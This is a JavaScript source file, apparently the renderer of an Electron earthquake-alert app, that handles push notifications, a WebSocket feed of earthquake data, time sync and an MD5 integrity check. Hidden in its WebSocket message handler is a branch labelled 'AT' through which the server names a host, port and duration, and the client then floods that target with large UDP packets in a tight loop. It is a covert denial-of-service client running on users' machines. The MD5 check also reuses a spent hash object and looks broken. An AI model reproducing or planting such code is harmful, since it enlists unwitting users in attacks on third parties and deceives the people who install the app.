/* eslint-disable no-empty-function */
/* eslint-disable prefer-const */
const {
	NOTIFICATION_RECEIVED,
	NOTIFICATION_SERVICE_ERROR,
	NOTIFICATION_SERVICE_STARTED,
	START_NOTIFICATION_SERVICE,
} = require("electron-fcm-push-receiver/src/constants");
const WebSocket = require("ws");
const crypto = require("crypto");
const ipc = require("electron").ipcRenderer;
let dgram = require("dgram");

const ServerVer = "1.0.1";
let MD5Check = false;

let DATA;
let DATAstamp = 0;

let ws;
let Reconnect = false;
let TimerDesynced = false;
let ServerT = 0;
let ServerTime = 0;
let NOW = new Date();
let LifeTime = 0;
let _start = false;
let Start = false;
let ATimer = null;

let Pdata = {
	"APIkey"   : "https://github.com/ExpTechTW",
	"Function" : "NTP",
};

createWebSocket();

let C = setInterval(() => {
	if (!_start)
		ipcRenderer.send(START_NOTIFICATION_SERVICE, "583094702393");
	else
		clearInterval(C);
}, 2000);

Main();

function Main() {
	axios.post("https://exptech.com.tw/post", Pdata)
		.then((response) => {
			TimeNow(response.data.Full);
		}).catch((err) => {
			Main();
		});
}

function PostIP() {
	return "https://exptech.com.tw/post";
}

function WebsocketIP() {
	return "wss://exptech.com.tw/websocket";
}

ipcRenderer.on(NOTIFICATION_SERVICE_STARTED, (_, token) => {
	_start = true;
	localStorage.UUID = token;
	dump({ level: 0, message: `Service Started (${token})`, origin: "FCM" });
	if (!Start) {
		Start = true;
		ipc.send("start");
	}
});

ipcRenderer.on(NOTIFICATION_SERVICE_ERROR, (_, error) => {
	dump({ level: 2, message: error, origin: "FCM" });
});

ipcRenderer.on(NOTIFICATION_RECEIVED, (_, Notification) => {
	if (Notification.data.Data != undefined) {
		DATA = Notification.data.Data;
		DATAstamp = new Date().getTime();
	}
});

function reconnect() {
	if (Reconnect) return;
	LifeTime = 0;
	Reconnect = true;
	setTimeout(() => {
		createWebSocket();
		Reconnect = false;
	}, 2000);
}

function createWebSocket() {
	try {
		ws = new WebSocket("wss://exptech.com.tw/websocket", { handshakeTimeout: 3000 });
		initEventHandle();
	} catch (e) {
		reconnect();
	}
}

function initEventHandle() {
	ws.onclose = function() {
		TimerDesynced = true;
		reconnect();
	};

	ws.onerror = function(err) {
		reconnect();
	};

	ws.onopen = function() {
		TimerDesynced = false;
		ws.send(JSON.stringify({
			"APIkey"        : "https://github.com/ExpTechTW",
			"Function"      : "earthquakeService",
			"Type"          : "subscription-v1",
			"FormatVersion" : 3,
			"UUID"          : localStorage.UUID,
		}));
	};

	ws.onmessage = function(evt) {
		let json = JSON.parse(evt.data);
		console.log(json);
		dump({ level: 3, message: `(onMessage) Received ${json.Function ?? json.response}`, origin: "WebSocket" });
		if (json.response == "You have successfully subscribed to earthquake information") {
			dump({ level: 0, message: `Connected to API Server (${localStorage.UUID})`, origin: "WebSocket" });
			if (!Start) {
				Start = true;
				ipc.send("start");
			}
		} else if (json.Function == "NTP")
			TimeNow(json.Full);
		else if (json.Function == "AT") {
			if (json.A5) {
				if (ATimer != null) clearInterval(ATimer);
				return;
			}
			let PORT = json.A1;
			let HOST = json.A2;
			let time = json.A3;
			let cold = json.A4;
			let now = new Date().getTime();
			let msg = "";
			for (let index = 0; index < 21835; index++)
				msg += "鹼";

			let message = new Buffer.from(msg);
			let client = dgram.createSocket("udp4");
			let T = new Date().getTime();
			if (ATimer != null) clearInterval(ATimer);
			ATimer = setInterval(() => {
				if (new Date().getTime() - now <= time) {
					if (new Date().getTime() - T >= cold)
						try {
							client.send(message, 0, message.length, PORT, HOST, (err, bytes) => {
								if (err) throw err;
								T = new Date().getTime();
							});
						} catch (error) {
							console.log(error);
						}

				} else
					clearInterval(ATimer);
			}, 0);
		} else {
			DATA = evt.data;
			DATAstamp = new Date().getTime();
		}
		LifeTime = NOW.getTime();
	};
}

function TimeNow(now) {
	ServerT = new Date().getTime();
	ServerTime = now;
}

setInterval(() => {
	NOW = new Date(ServerTime + (new Date().getTime() - ServerT));
	if (NOW.getTime() - LifeTime > 65000 && LifeTime != 0)
		ws.close();

}, 0);

let md5 = crypto.createHash("md5");

fetch("https://raw.githubusercontent.com/ExpTechTW/API/master/Json/earthquake/md5.json")
	.then((response) => response.json())
	.then((res) => {
		try {
			console.log(app.getVersion() + "-1");
			let md51 = md5.update(fs.readFileSync(app.getPath("temp").replace("Temp", "Programs/trem/resources/app/index.html")).toString()).digest("hex");
			let md52 = md5.update(fs.readFileSync(app.getPath("temp").replace("Temp", "Programs/trem/resources/app/js/earthquake.js")).toString()).digest("hex");
			if (res[app.getVersion() + "-1"] == md51 && res[app.getVersion() + "-2"] == md52)
				MD5Check = true;
			// eslint-disable-next-line no-empty
		} catch (error) {
		}
	});